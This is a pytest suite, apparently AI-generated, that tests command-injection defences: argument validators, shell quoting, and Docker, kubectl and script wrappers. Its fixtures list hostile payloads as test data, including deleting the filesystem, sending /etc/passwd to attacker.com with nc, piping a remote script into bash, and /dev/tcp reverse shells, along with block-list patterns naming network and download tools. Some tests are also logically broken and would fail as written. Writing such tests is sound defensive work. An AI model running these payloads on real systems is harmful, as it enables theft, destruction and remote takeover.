"""
AGENT 9: Command Injection Prevention Tests
Comprehensive test suite for command injection attack prevention and system security.
"""

import pytest
import asyncio
import os
import subprocess
import shlex
import time
from unittest.mock import Mock, patch, MagicMock, call
from typing import Dict, Any, List, Optional
import tempfile
import shutil
from pathlib import Path

# Security-focused imports
import re
import json
import base64

# Core imports
from src.core.errors.base_exceptions import SecurityError, ValidationError
from src.monitoring.logger_config import get_logger


class TestCommandInjectionPrevention:
    """Test command injection prevention across all system interfaces."""
    
    @pytest.fixture
    def malicious_commands(self):
        """Collection of malicious command injection payloads."""
        return [
            # Basic command injection
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test || whoami",
            "test | nc attacker.com 4444 < /etc/passwd",
            
            # Command substitution
            "test`whoami`",
            "test$(whoami)",
            "test$((1+1))",
            
            # File redirection attacks
            "test > /tmp/malicious.sh",
            "test >> /etc/hosts",
            "test < /etc/passwd",
            
            # Background execution
            "test & python -c 'import socket...'",
            "test; nohup malicious_script.sh &",
            
            # Environment variable manipulation
            "test; export PATH=/tmp:$PATH; malicious_binary",
            "test; HOME=/tmp; cd $HOME",
            
            # Shell expansion attacks
            "test; echo $PATH",
            "test; ls *",
            "test; find / -name '*.conf'",
            
            # Encoded injection
            "test; echo 'bWFsaWNpb3VzX2NvbW1hbmQ=' | base64 -d | sh",
            "test; $(echo -e '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
            
            # Script injection
            "test; python -c \"import os; os.system('rm -rf /')\"",
            "test; perl -e \"system('malicious_command')\"",
            "test; ruby -e \"system('dangerous_operation')\"",
            
            # Network-based attacks
            "test; wget http://malicious.com/script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh",
            "test; curl -s http://attacker.com/payload | bash",
            
            # Windows-specific attacks (if applicable)
            "test & dir C:\\",
            "test && type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "test || powershell.exe -Command \"Get-Process\"",
            
            # Process manipulation
            "test; killall -9 python",
            "test; ps aux | grep password",
            "test; netstat -tulpn",
            
            # Advanced techniques
            "test; exec 196<>/dev/tcp/attacker.com/4444; sh <&196 >&196 2>&196",
            "test; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        ]
    
    @pytest.fixture
    def safe_commands(self):
        """Collection of safe, legitimate commands."""
        return [
            "test_file.txt",
            "normal_argument",
            "/path/to/legitimate/file",
            "user123",
            "config_value",
            "2023-10-15",
            "localhost",
            "8080",
            "application.log",
            "data_export.csv",
        ]
    
    def test_subprocess_command_injection_prevention(self, malicious_commands, safe_commands):
        """Test that subprocess calls prevent command injection."""
        
        def safe_subprocess_call(command: str, *args) -> str:
            """Safely execute subprocess with proper validation."""
            
            # Whitelist allowed commands
            allowed_commands = [
                "ls", "cat", "grep", "sort", "head", "tail",
                "python", "pip", "docker", "kubectl"
            ]
            
            if command not in allowed_commands:
                raise SecurityError(f"Command not allowed: {command}")
            
            # Validate arguments
            for arg in args:
                if not self._validate_command_argument(arg):
                    raise SecurityError(f"Invalid argument: {arg}")
            
            # Use subprocess with shell=False and explicit argument list
            try:
                result = subprocess.run(
                    [command] + list(args),
                    capture_output=True,
                    text=True,
                    timeout=10,
                    shell=False,  # Critical: never use shell=True
                    check=True
                )
                return result.stdout
            except subprocess.TimeoutExpired:
                raise SecurityError("Command execution timeout")
            except subprocess.CalledProcessError as e:
                raise SecurityError(f"Command execution failed: {e}")
        
        # Test that malicious commands are blocked
        for malicious_cmd in malicious_commands:
            with pytest.raises(SecurityError):
                # Try to execute malicious command
                if ";" in malicious_cmd or "&" in malicious_cmd or "|" in malicious_cmd:
                    # These should be blocked by argument validation
                    safe_subprocess_call("echo", malicious_cmd)
                else:
                    # Command itself might be blocked
                    safe_subprocess_call(malicious_cmd.split()[0])
        
        # Test that safe commands work
        for safe_cmd in safe_commands:
            try:
                # This should work (though command might not exist in test environment)
                safe_subprocess_call("echo", safe_cmd)
            except SecurityError as e:
                # Should only fail due to command not being whitelisted
                assert "not allowed" in str(e) or "Invalid argument" in str(e)
    
    def test_shell_escape_functions(self, malicious_commands, safe_commands):
        """Test shell escaping and quoting functions."""
        
        def safe_shell_escape(argument: str) -> str:
            """Safely escape shell arguments."""
            return shlex.quote(argument)
        
        def validate_escaped_argument(original: str, escaped: str) -> bool:
            """Validate that escaped argument is safe."""
            # Check that dangerous characters are properly escaped
            dangerous_chars = [";", "&", "|", "`", "$", "(", ")", "<", ">", "*", "?", "[", "]", "{", "}"]
            
            for char in dangerous_chars:
                if char in original and char in escaped:
                    # If dangerous char exists in original, it should be escaped
                    if escaped.count("'") < 2 and escaped.count('"') < 2:
                        return False  # Not properly quoted
            
            return True
        
        # Test escaping of malicious commands
        for malicious_cmd in malicious_commands:
            escaped = safe_shell_escape(malicious_cmd)
            assert validate_escaped_argument(malicious_cmd, escaped)
            
            # Verify that the escaped version is safe
            assert escaped.startswith("'") or '"' in escaped or "\\" in escaped
        
        # Test that safe commands remain functional after escaping
        for safe_cmd in safe_commands:
            escaped = safe_shell_escape(safe_cmd)
            assert validate_escaped_argument(safe_cmd, escaped)
    
    def test_input_validation_for_system_calls(self, malicious_commands):
        """Test input validation before system calls."""
        
        def validate_system_input(user_input: str) -> bool:
            """Validate input before system calls."""
            
            # Check for command injection patterns
            dangerous_patterns = [
                r"[;&|`$(){}[\]<>*?]",  # Shell metacharacters
                r"\.\./",               # Directory traversal
                r"sudo|su|passwd|chmod|chown",  # Privileged commands
                r"rm\s+-[rf]",         # Dangerous file operations
                r"nc|netcat|telnet",   # Network tools
                r"python|perl|ruby|bash|sh",  # Script interpreters
                r"wget|curl|ftp",      # Download tools
                r"kill|killall|pkill", # Process management
                r"exec|eval|system",   # Code execution
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return False
            
            return True
        
        # Test that malicious inputs are rejected
        for malicious_cmd in malicious_commands:
            assert not validate_system_input(malicious_cmd)
        
        # Test that safe inputs are accepted
        safe_inputs = ["file.txt", "user123", "config_value", "2023-10-15"]
        for safe_input in safe_inputs:
            assert validate_system_input(safe_input)
    
    def test_file_operation_command_injection_prevention(self, malicious_commands):
        """Test command injection prevention in file operations."""
        
        def safe_file_operation(operation: str, filepath: str) -> bool:
            """Safely perform file operations."""
            
            # Validate operation
            allowed_operations = ["read", "write", "delete", "copy", "move"]
            if operation not in allowed_operations:
                raise SecurityError(f"Operation not allowed: {operation}")
            
            # Validate filepath
            if not self._validate_filepath(filepath):
                raise SecurityError(f"Invalid filepath: {filepath}")
            
            # Perform operation without shell
            if operation == "read":
                with open(filepath, 'r') as f:
                    return True
            elif operation == "write":
                with open(filepath, 'w') as f:
                    return True
            elif operation == "delete":
                os.unlink(filepath)
                return True
            elif operation == "copy":
                shutil.copy2(filepath, f"{filepath}.backup")
                return True
            elif operation == "move":
                shutil.move(filepath, f"{filepath}.moved")
                return True
            
            return False
        
        # Test with malicious filepaths
        for malicious_cmd in malicious_commands:
            with pytest.raises(SecurityError):
                safe_file_operation("read", malicious_cmd)
    
    def test_environment_variable_injection_prevention(self, malicious_commands):
        """Test prevention of command injection through environment variables."""
        
        def safe_environment_setup(env_vars: Dict[str, str]) -> Dict[str, str]:
            """Safely set up environment variables."""
            
            safe_env = {}
            
            for key, value in env_vars.items():
                # Validate environment variable name
                if not re.match(r'^[A-Z_][A-Z0-9_]*$', key):
                    raise SecurityError(f"Invalid environment variable name: {key}")
                
                # Validate environment variable value
                if not self._validate_env_value(value):
                    raise SecurityError(f"Invalid environment variable value: {key}={value}")
                
                safe_env[key] = value
            
            return safe_env
        
        # Test with malicious environment values
        for malicious_cmd in malicious_commands:
            with pytest.raises(SecurityError):
                safe_environment_setup({"TEST_VAR": malicious_cmd})
    
    def test_docker_command_injection_prevention(self, malicious_commands):
        """Test command injection prevention in Docker operations."""
        
        def safe_docker_operation(operation: str, *args) -> str:
            """Safely execute Docker operations."""
            
            # Validate Docker operation
            allowed_operations = ["run", "build", "pull", "push", "ps", "logs", "exec"]
            if operation not in allowed_operations:
                raise SecurityError(f"Docker operation not allowed: {operation}")
            
            # Validate arguments
            safe_args = []
            for arg in args:
                if not self._validate_docker_argument(arg):
                    raise SecurityError(f"Invalid Docker argument: {arg}")
                safe_args.append(shlex.quote(arg))
            
            # Construct safe Docker command
            docker_cmd = ["docker", operation] + safe_args
            
            # Execute without shell
            try:
                result = subprocess.run(
                    docker_cmd,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    shell=False,
                    check=True
                )
                return result.stdout
            except subprocess.CalledProcessError as e:
                raise SecurityError(f"Docker operation failed: {e}")
        
        # Test with malicious Docker arguments
        for malicious_cmd in malicious_commands:
            with pytest.raises(SecurityError):
                safe_docker_operation("run", malicious_cmd)
    
    def test_kubernetes_command_injection_prevention(self, malicious_commands):
        """Test command injection prevention in Kubernetes operations."""
        
        def safe_kubectl_operation(operation: str, resource: str, name: str, **kwargs) -> str:
            """Safely execute kubectl operations."""
            
            # Validate kubectl operation
            allowed_operations = ["get", "describe", "logs", "apply", "delete", "create"]
            if operation not in allowed_operations:
                raise SecurityError(f"kubectl operation not allowed: {operation}")
            
            # Validate resource type
            allowed_resources = ["pod", "service", "deployment", "configmap", "secret"]
            if resource not in allowed_resources:
                raise SecurityError(f"Resource type not allowed: {resource}")
            
            # Validate resource name
            if not self._validate_k8s_name(name):
                raise SecurityError(f"Invalid Kubernetes resource name: {name}")
            
            # Build safe command
            kubectl_cmd = ["kubectl", operation, resource, name]
            
            # Add safe flags
            for key, value in kwargs.items():
                if key in ["namespace", "output", "selector"]:
                    if self._validate_k8s_value(value):
                        kubectl_cmd.extend([f"--{key}", shlex.quote(value)])
            
            # Execute without shell
            try:
                result = subprocess.run(
                    kubectl_cmd,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    shell=False,
                    check=True
                )
                return result.stdout
            except subprocess.CalledProcessError as e:
                raise SecurityError(f"kubectl operation failed: {e}")
        
        # Test with malicious Kubernetes names
        for malicious_cmd in malicious_commands:
            with pytest.raises(SecurityError):
                safe_kubectl_operation("get", "pod", malicious_cmd)
    
    def test_script_execution_prevention(self, malicious_commands):
        """Test prevention of script execution command injection."""
        
        def safe_script_execution(script_path: str, *args) -> str:
            """Safely execute scripts with validation."""
            
            # Validate script path
            if not self._validate_script_path(script_path):
                raise SecurityError(f"Invalid script path: {script_path}")
            
            # Validate script exists and is executable
            if not os.path.exists(script_path):
                raise SecurityError(f"Script not found: {script_path}")
            
            if not os.access(script_path, os.X_OK):
                raise SecurityError(f"Script not executable: {script_path}")
            
            # Validate arguments
            safe_args = []
            for arg in args:
                if not self._validate_script_argument(arg):
                    raise SecurityError(f"Invalid script argument: {arg}")
                safe_args.append(arg)
            
            # Execute script safely
            try:
                result = subprocess.run(
                    [script_path] + safe_args,
                    capture_output=True,
                    text=True,
                    timeout=60,
                    shell=False,
                    check=True,
                    cwd="/tmp",  # Safe working directory
                    env={"PATH": "/usr/bin:/bin"}  # Minimal environment
                )
                return result.stdout
            except subprocess.CalledProcessError as e:
                raise SecurityError(f"Script execution failed: {e}")
        
        # Test with malicious script arguments
        for malicious_cmd in malicious_commands:
            with pytest.raises(SecurityError):
                safe_script_execution("/bin/echo", malicious_cmd)
    
    def test_log_processing_command_injection_prevention(self, malicious_commands):
        """Test command injection prevention in log processing."""
        
        def safe_log_processing(log_data: str, operation: str) -> str:
            """Safely process log data without command injection."""
            
            # Validate operation
            allowed_operations = ["filter", "count", "search", "export"]
            if operation not in allowed_operations:
                raise SecurityError(f"Log operation not allowed: {operation}")
            
            # Sanitize log data
            sanitized_data = self._sanitize_log_data(log_data)
            
            # Process using safe methods (no shell commands)
            if operation == "filter":
                lines = sanitized_data.split('\n')
                return '\n'.join(line for line in lines if len(line) > 0)
            elif operation == "count":
                return str(len(sanitized_data.split('\n')))
            elif operation == "search":
                # Use Python string methods, not grep
                lines = sanitized_data.split('\n')
                return '\n'.join(line for line in lines if "ERROR" in line)
            elif operation == "export":
                # Write to safe location
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                    f.write(sanitized_data)
                    return f.name
            
            return ""
        
        # Test with malicious log data
        for malicious_cmd in malicious_commands:
            try:
                result = safe_log_processing(malicious_cmd, "filter")
                # Should not contain any shell metacharacters in result
                assert not any(char in result for char in [";", "&", "|", "`", "$"])
            except SecurityError:
                # Expected for invalid operations
                pass
    
    # Helper methods for validation
    def _validate_command_argument(self, arg: str) -> bool:
        """Validate command line argument."""
        # Check for shell metacharacters
        dangerous_chars = [";", "&", "|", "`", "$", "(", ")", "<", ">", "*", "?"]
        return not any(char in arg for char in dangerous_chars)
    
    def _validate_filepath(self, filepath: str) -> bool:
        """Validate file path for safety."""
        # Check for directory traversal
        if "../" in filepath or "/.." in filepath:
            return False
        
        # Check for absolute paths outside allowed directories
        allowed_prefixes = ["/tmp/", "/var/log/", "/opt/app/"]
        if filepath.startswith("/") and not any(filepath.startswith(prefix) for prefix in allowed_prefixes):
            return False
        
        # Check for shell metacharacters
        dangerous_chars = [";", "&", "|", "`", "$", "*", "?"]
        return not any(char in filepath for char in dangerous_chars)
    
    def _validate_env_value(self, value: str) -> bool:
        """Validate environment variable value."""
        # Check for command injection patterns
        dangerous_patterns = [";", "&", "|", "`", "$", "$(", ")", "<", ">"]
        return not any(pattern in value for pattern in dangerous_patterns)
    
    def _validate_docker_argument(self, arg: str) -> bool:
        """Validate Docker command argument."""
        # Check for dangerous Docker options
        dangerous_options = ["--privileged", "--pid=host", "--network=host", "--cap-add=SYS_ADMIN"]
        if any(opt in arg for opt in dangerous_options):
            return False
        
        # Check for shell metacharacters
        return self._validate_command_argument(arg)
    
    def _validate_k8s_name(self, name: str) -> bool:
        """Validate Kubernetes resource name."""
        # K8s names must follow specific format
        return re.match(r'^[a-z0-9]([-a-z0-9]*[a-z0-9])?$', name) is not None
    
    def _validate_k8s_value(self, value: str) -> bool:
        """Validate Kubernetes command value."""
        # Check for shell metacharacters
        return self._validate_command_argument(value)
    
    def _validate_script_path(self, script_path: str) -> bool:
        """Validate script path for safety."""
        # Must be absolute path in allowed directories
        allowed_dirs = ["/opt/app/scripts/", "/usr/local/bin/", "/tmp/"]
        return any(script_path.startswith(allowed_dir) for allowed_dir in allowed_dirs)
    
    def _validate_script_argument(self, arg: str) -> bool:
        """Validate script argument."""
        return self._validate_command_argument(arg)
    
    def _sanitize_log_data(self, log_data: str) -> str:
        """Sanitize log data to prevent injection."""
        # Remove or escape dangerous characters
        sanitized = log_data.replace(";", "")
        sanitized = sanitized.replace("&", "")
        sanitized = sanitized.replace("|", "")
        sanitized = sanitized.replace("`", "")
        sanitized = sanitized.replace("$", "")
        return sanitized


class TestCommandInjectionIntegration:
    """Integration tests for command injection prevention across the system."""
    
    def test_end_to_end_command_injection_prevention(self):
        """Test command injection prevention across the entire system."""
        
        malicious_inputs = [
            "test; rm -rf /",
            "file.txt && cat /etc/passwd",
            "config$(whoami)",
        ]
        
        for malicious_input in malicious_inputs:
            # Test the full flow: user input -> validation -> system call
            try:
                # Step 1: Input validation
                validated_input = self._validate_user_input(malicious_input)
                
                # Step 2: System operation
                result = self._perform_system_operation(validated_input)
                
                # Should either be safely handled or raise an exception
                assert result is not None or True
                
            except (SecurityError, ValidationError):
                # Expected for malicious inputs
                pass
            except Exception as e:
                # Other exceptions should not expose sensitive information
                assert "password" not in str(e).lower()
                assert "/etc/" not in str(e).lower()
    
    def test_concurrent_command_execution_security(self):
        """Test security under concurrent command execution."""
        
        import threading
        import queue
        
        results = queue.Queue()
        
        def worker_thread(thread_id: int):
            """Worker thread for concurrent testing."""
            try:
                # Each thread tries to execute a command
                result = self._safe_command_execution(f"echo thread_{thread_id}")
                results.put(("success", thread_id, result))
            except Exception as e:
                results.put(("error", thread_id, str(e)))
        
        # Start multiple threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=worker_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Verify all threads completed successfully
        success_count = 0
        error_count = 0
        
        while not results.empty():
            status, thread_id, result = results.get()
            if status == "success":
                success_count += 1
                # Verify result doesn't contain injection artifacts
                assert ";" not in result
                assert "&" not in result
            else:
                error_count += 1
        
        # Most threads should complete successfully
        assert success_count >= 3, f"Too many failed executions: {error_count} errors"
    
    def test_performance_impact_of_command_security(self):
        """Test that command security measures don't significantly impact performance."""
        
        import time
        
        # Test command execution time with security measures
        start_time = time.perf_counter()
        
        # Execute 100 safe commands
        for i in range(100):
            self._safe_command_execution(f"echo test_{i}")
        
        end_time = time.perf_counter()
        execution_time = end_time - start_time
        
        # Should complete within reasonable time (< 5 seconds for 100 commands)
        assert execution_time < 5.0, f"Security measures causing performance degradation: {execution_time}s"
    
    # Helper methods
    def _validate_user_input(self, user_input: str) -> str:
        """Validate user input."""
        dangerous_patterns = [";", "&", "|", "`", "$"]
        for pattern in dangerous_patterns:
            if pattern in user_input:
                raise SecurityError(f"Dangerous pattern detected: {pattern}")
        return user_input
    
    def _perform_system_operation(self, validated_input: str) -> str:
        """Perform system operation safely."""
        # Simulate safe system operation
        return f"processed: {validated_input}"
    
    def _safe_command_execution(self, command: str) -> str:
        """Execute command safely."""
        # Simulate safe command execution
        if any(char in command for char in [";", "&", "|", "`", "$"]):
            raise SecurityError("Dangerous characters in command")
        return f"executed: {command}"


@pytest.mark.security
@pytest.mark.unit
class TestCommandInjectionRegressionTests:
    """Regression tests to ensure command injection fixes remain effective."""
    
    def test_known_command_injection_vulnerabilities(self):
        """Test that previously discovered command injection vulnerabilities are fixed."""
        
        vulnerability_test_cases = [
            {
                "name": "file_operation_injection",
                "input": "file.txt; rm -rf /tmp/*",
                "expected_behavior": "blocked"
            },
            {
                "name": "environment_variable_injection",
                "input": "PATH=/tmp:$PATH; malicious_binary",
                "expected_behavior": "blocked"
            },
            {
                "name": "script_argument_injection",
                "input": "arg1 && dangerous_command",
                "expected_behavior": "blocked"
            },
        ]
        
        for test_case in vulnerability_test_cases:
            try:
                result = self._test_command_vulnerability_fix(test_case["input"])
                assert result["status"] == "blocked", f"Vulnerability not blocked: {test_case['name']}"
            except (SecurityError, ValidationError):
                # Exception is expected for blocked attempts
                pass
    
    def test_new_command_injection_vectors(self):
        """Test protection against new command injection attack vectors."""
        
        # Test modern command injection techniques
        modern_attacks = [
            # Process substitution
            "test <(malicious_command)",
            
            # Here documents
            "test <<EOF\nmalicious_content\nEOF",
            
            # Arithmetic expansion
            "test $((system('malicious_command')))",
            
            # Brace expansion
            "test {1..10000}",  # Potential DoS
        ]
        
        for attack in modern_attacks:
            with pytest.raises((SecurityError, ValidationError)):
                self._test_command_vulnerability_fix(attack)
    
    def _test_command_vulnerability_fix(self, malicious_input: str) -> Dict[str, Any]:
        """Test that a specific command injection vulnerability is fixed."""
        
        # Simulate the vulnerability test
        dangerous_patterns = [";", "&", "|", "`", "$", "(", ")", "<", ">"]
        
        if any(pattern in malicious_input for pattern in dangerous_patterns):
            return {"status": "blocked", "reason": "dangerous_pattern_detected"}
        
        # If we get here, the input wasn't blocked (potential vulnerability)
        return {"status": "allowed", "input": malicious_input}